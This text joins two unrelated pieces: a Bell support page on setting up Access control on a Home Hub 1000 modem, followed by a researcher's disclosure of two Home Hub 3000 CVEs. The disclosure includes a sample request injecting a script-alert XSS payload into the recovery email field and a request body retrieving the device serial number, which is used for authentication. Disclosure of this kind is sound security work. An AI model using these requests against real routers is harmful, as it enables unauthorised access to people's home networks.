# How to set up Access control in a Home Hub 1000 modem?

[Internet support](/Internet/Connection-help)

What is Access control

## What is Access control

The Access control feature of your Home Hub lets 1000 you set the time and day a particular device can access the Internet. It blocks all Internet features, including email, social messaging or Skype.

There are two ways you can control access to the Internet:

1. Create a schedule for specific devices
2. Always block a device

As an example, you can limit the time your children spend online by specifying a day and time when their device (laptop, tablet, etc.) cannot access the Internet.

Access control only blocks Internet connections; it will not prevent devices from accessing other devices on the local network (e.g. , network printers, local file sharing between devices).

For a Home Hub  2000 modem and above, manage Access control with the [Bell Wi-Fi app](/internet/connection-help/what-is-the-bell-wi-fi-app-and-how-do-i-use-it?step=5#step5).

Create a schedule

With your Home Hub 1000 modem, you can specify time periods when particular devices cannot access the Internet.

1. Open your web browser and visit **[bell.ca/mymodem](https://bell.ca/mymodem) or 192.168.2.1**.
2. From the home screen, click on **Access control**.
3. Click the **Create a new schedule** button.
4. Give the schedule a name.
5. From the list of available devices, select the ones that you want to apply this schedule to.
   **Note:** A device must have connected to your network at least once for it to show up in the list.
6. Click the **Apply** button.
7. A calendar will appear. Select the start and end times as well as the days of the week during which you want the blocked access to be in effect.
8. Click the **Apply** button.
9. Click the **Save** button.

Always block access

You can block devices from accessing the Internet at all times. These devices will not have access to the Internet until you remove them from this list.

To block Internet access:

1. Open your web browser and visit **[bell.ca/mymodem](https://bell.ca/mymodem) or 192.168.2.1**.
2. From the home screen, click on **Access control**.
3. Click on the pencil next to **Always block**.
4. Select the devices you want to block.
5. Click the **Apply** button.
6. Click the **Save** button.

Modify an existing schedule

You can modify the devices and blocked times for existing schedules:

1. Open your web browser and visit **[bell.ca/mymodem](https://bell.ca/mymodem) or 192.168.2.1**.
2. From the home screen, click on **Access control**.
3. Click on the pencil next to the schedule you wish to change.
4. Add or remove devices.
5. Click the **Apply** button.
6. Add new blocked time or click on an existing time block to modify or delete it.
7. Click the **Save** button.

Delete an existing schedule

You can delete existing schedules by clicking on the 'X' next to the schedule you wish to delete. This will delete the entire schedule.

1. Open your web browser and visit **[bell.ca/mymodem](https://bell.ca/mymodem) or 192.168.2.1**.
2. From the Home screen, click on **Access control**.
3. Under *Edit / View* rules select the rule you wish to delete and click the ‘X’.

Override an active blocked session

You can temporarily grant Internet access to a device that is currently blocked by Access control. Overriding provides access to the Internet until the next scheduled blocked time takes effect.

If you have access to the device that's blocked, simply sign in with your modem's administrator password directly on the status page that appeared when the device tried to access the Internet.

# Bell Home Hub 3000 Vulnerabilites

#### CVEâs

XSS: CVE-2020-11448

Serial Number Leak: CVE-2020-11447

## Foreword

This is some research I performed in 2020, and attempted to disclose to them during that time period. I had communicated with them during 2020, and reported the vulnerabilities to there team, and they ended up ghosting me. So now that well, 3+ years have past, its finally time to publish these.

These arenât major vulnerabilities, but show the lack of care taken when programming something secure.

### CVE-2020-11448 - XSS Within Login Page

---

Within the Routers firmware page you are able to set a Recovery Email + Recovery Password to get your admin panel password incase you forget it, However the limits on what you are allowed to put in it are *client-side*, meaning if you intercept the request with a tool like burp, you are able to do stuff like this on the login window

[![](https://images.0xem.ma/u/JpGHpJ.png)](https://images.0xem.ma/u/JpGHpJ.png)

You can change either the phone # or email to the same effect, (ex payload `<script>alert(\"1\");</script>`

Sample Request:

`| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ``` | ``` POST /cgi/json-req HTTP/1.1 Host: 192.168.2.1 Content-Length: 739 Accept: application/json, text/javascript, */*; q=0.01 Origin: http://192.168.2.1 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Referer: http://192.168.2.1/?c=modempreferences Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: ignoreMobileRedirectCheck=true; lang=en; bell_session={"req_id":116,"sess_id":1570480049,"basic":false,"user":"admin","dataModel":{"name":"Internal","nss":[{"name":"gtw","uri":"http://sagemcom.com/gateway-data"}]},"ha1":"xyz","nonce":"2126360995"} Connection: close  req={"request":{"id":115,"session-id":1570480049,"priority":false,"actions":[{"id":0,"method":"setValue","xpath":"Device/Services/SetLEDState","parameters":{"value":true}},{"id":1,"method":"setValue","xpath":"Device/Services/Notification/CredentialsRequestEnable","parameters":{"value":true}},{"id":2,"method":"setValue","xpath":"Device/Services/Notification/DestinationEmailAddress","parameters":{"value":"<script>alert(\"test\");</script>"}},{"id":3,"method":"setValue","xpath":"Device/Services/Notification/DestinationSMSNumber","parameters":{"value":""}},{"id":4,"method":"setValue","xpath":"Device/Services/Notification/DisplayOnScreen","parameters":{"value":true}}],"cnonce":3315927412,"auth-key":"618c8f5c9213624cffd403747b257c5f"}}  ``` |
| --- | --- |`

(Decoded from URL Encoding, needs valid Authentication)

### CVE-2020-11447 - Serial Number leak leading to authentication bypass

---

The Main Method of the Home Hub data storage is done with XML, and you can interface with it via /cgi/json-req and XPATH, you are able to retrieve and set most values. Within the router, the serial number is used as a second means of authentication.

[![](//8FoDJzN.png)](//8FoDJzN.png)

if we send a âgetValueâ to XPATH `"Device/DeviceInfo/SerialNumber"` we are able to view this serial number, and obtain further access within the device,

Sample Request Body:

`| ``` 1  ``` | ``` req={"request":{"id":request-id,"session-id":session-id,"priority":false,"actions":[{"id":0,"method":"getValue","xpath":"Device/DeviceInfo/SerialNumber"}],"cnonce":cnonce,"auth-key":"authkey"}}  ``` |
| --- | --- |`

Note: you need to be authenticated to perform this.

### Other interesting findings:

---

During my research I found several interesting findings not mentioned above, I was able to dump the entire XPATH by sending a getValue to Device//\* and noticed several unused features within the device, such as captive portal support, but most interestingly *ssh and telnet* and some remote management features, upon trying to enable SSH I get a Non writable error, however I see within the browser source code a remote user is able to enable it from the settings, and the UID of the user we use to login with is uid 4, meaning there is at least 3 other accounts within the system.
